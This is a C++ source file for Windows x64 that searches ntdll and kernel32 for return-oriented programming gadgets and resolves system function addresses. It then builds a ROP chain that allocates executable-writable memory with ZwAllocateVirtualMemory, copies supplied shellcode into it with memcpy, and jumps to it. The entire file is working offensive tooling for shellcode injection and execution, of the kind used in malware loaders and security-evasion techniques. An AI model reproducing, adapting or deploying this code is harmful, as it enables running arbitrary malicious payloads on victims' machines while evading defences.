#include "ROPHelper.h"

#include <iostream>
using namespace std;

ULONGLONG FindPopGadgets(BYTE* Ntdll, BYTE* PopGadgets, size_t PopGadgetsLen)
{

	ULONGLONG i = 0;
	size_t j = 0;

	for (i = 0; i < 0x100000; ++i)
	{
		for (j = 0; j < PopGadgetsLen; ++j)
		{
			if (PopGadgets[j] != Ntdll[i + j])
				break;
		}
		if (j == PopGadgetsLen)
			return (ULONGLONG)&Ntdll[i];
	}

	return 0;
}


ULONGLONG NtYieldExecution{ 0 };
ULONGLONG PopGadgetsAddress{ 0 };
ULONGLONG PushRaxAddress{ 0 };

ULONGLONG MessageBoxAddress{ 0 };
ULONGLONG CreateMutexAddress{ 0 };
ULONGLONG RtlExitUserThreadAddress{ 0 };
ULONGLONG VirtualProtectAddress{ 0 };

ULONGLONG ZwAllocateVirtualMemoryAddress{ 0 };
ULONGLONG MemcpyAddress{ 0 };

VOID FindFunctionAddresses() {
	BYTE PopGadgets[] = {
		0x58,
		0x5a,			// pop rdx
		0x59,			// pop rcx
		0x41, 0x58,		// pop r8
		0x41, 0x59,		// pop r9
		0x41, 0x5a,		// pop r10
		0x41, 0x5b,		// pop r11
		0xc3			// ret
	};

	BYTE PushRax[] = {
		0x50,  // push rax
		0xc3  // ret
	};

	HMODULE hUser32 = LoadLibraryA("user32.dll");
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	HMODULE hKernelBase = GetModuleHandleA("kernelbase.dll");
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

	MessageBoxAddress = (ULONGLONG)GetProcAddress(hUser32, "MessageBoxA");
	CreateMutexAddress = (ULONGLONG)GetProcAddress(hKernel32, "CreateMutexA");
	RtlExitUserThreadAddress = (ULONGLONG)GetProcAddress(hNtdll, "RtlExitUserThread");
	VirtualProtectAddress = (ULONGLONG)GetProcAddress(hKernelBase, "VirtualProtect");
	RtlExitUserThreadAddress = (ULONGLONG)GetProcAddress(hNtdll, "RtlExitUserThread");

	ZwAllocateVirtualMemoryAddress = (ULONGLONG)GetProcAddress(hNtdll, "ZwAllocateVirtualMemory");
	MemcpyAddress = (ULONGLONG)GetProcAddress(hNtdll, "memcpy");

	PopGadgetsAddress = FindPopGadgets((PBYTE)hNtdll, PopGadgets, sizeof(PopGadgets));

	PushRaxAddress = FindPopGadgets((PBYTE)hKernel32, PushRax, sizeof(PushRax));

	if (PushRaxAddress == 0)
		cout << "error" << endl;

	if (MessageBoxAddress == 0 ||
		RtlExitUserThreadAddress == 0 ||
		ZwAllocateVirtualMemoryAddress == 0)
		cout << "no function" << endl;

	if (PopGadgetsAddress == 0)
		cout << "2 zero" << endl;
}

VOID BuildSimpleRop(ROPBuffer* Rop, ULONGLONG ShellcodeSize, ULONGLONG RemoteShellcodeAddress) {
	/*NTSTATUS ZwAllocateVirtualMemory(
		_In_    HANDLE    ProcessHandle,
		_Inout_ PVOID * BaseAddress,
		_In_    ULONG_PTR ZeroBits,
		_Inout_ PSIZE_T   RegionSize,
		_In_    ULONG     AllocationType,
		_In_    ULONG     Protect
	);*/

	Rop->SetRip(PopGadgetsAddress + 0x1);

	Rop->InsertRopValue(Rop->GetRsp() + 0x80);  // arg2 = BaseAddress  // rdx
	Rop->InsertRopValue((ULONGLONG)GetCurrentProcess());  // arg1 = ProcessHandle  // rcx
	Rop->InsertRopDataPointer(NULL);  // arg3 = ZeroBits  // r8
	Rop->InsertRopDataPointer(2);  // arg4 = RegionSize  // r9

	Rop->InsertRopValue((ULONGLONG)-1);  // r10
	Rop->InsertRopValue((ULONGLONG)-1);  // r11

	Rop->InsertRopValue(ZwAllocateVirtualMemoryAddress);  // ret address

	Rop->InsertRopValue(PopGadgetsAddress + 0x1);  // ret address
	Rop->InsertRopValue((ULONGLONG)-1);  // rdx
	Rop->InsertRopValue((ULONGLONG)-1);  // rcx
	Rop->InsertRopValue((ULONGLONG)-1);  // r8
	Rop->InsertRopValue((ULONGLONG)-1);  // r9
	Rop->InsertRopValue(MEM_COMMIT);  // arg5 = AllocationType  // r10
	Rop->InsertRopValue(PAGE_EXECUTE_READWRITE);  // arg6 = Protect // r11

	//void* memcpy(
	//	void* dest,
	//	const void* src,
	//	size_t count
	//);

	Rop->InsertRopValue(PopGadgetsAddress + 0x1);  // ret address
	Rop->InsertRopValue(RemoteShellcodeAddress);  // arg2 = src  // rdx
	Rop->InsertRopValue(NULL);  // arg1 = dest  // rcx
	Rop->InsertRopValue(ShellcodeSize);  // arg3 = count  // r8
	Rop->InsertRopValue((ULONGLONG)-1);  // r9
	Rop->InsertRopValue((ULONGLONG)-1);  // r10
	Rop->InsertRopValue((ULONGLONG)-1);  // r11


	Rop->InsertRopValue(MemcpyAddress);  // ret address

	Rop->InsertRopValue(PushRaxAddress);  // ret address
}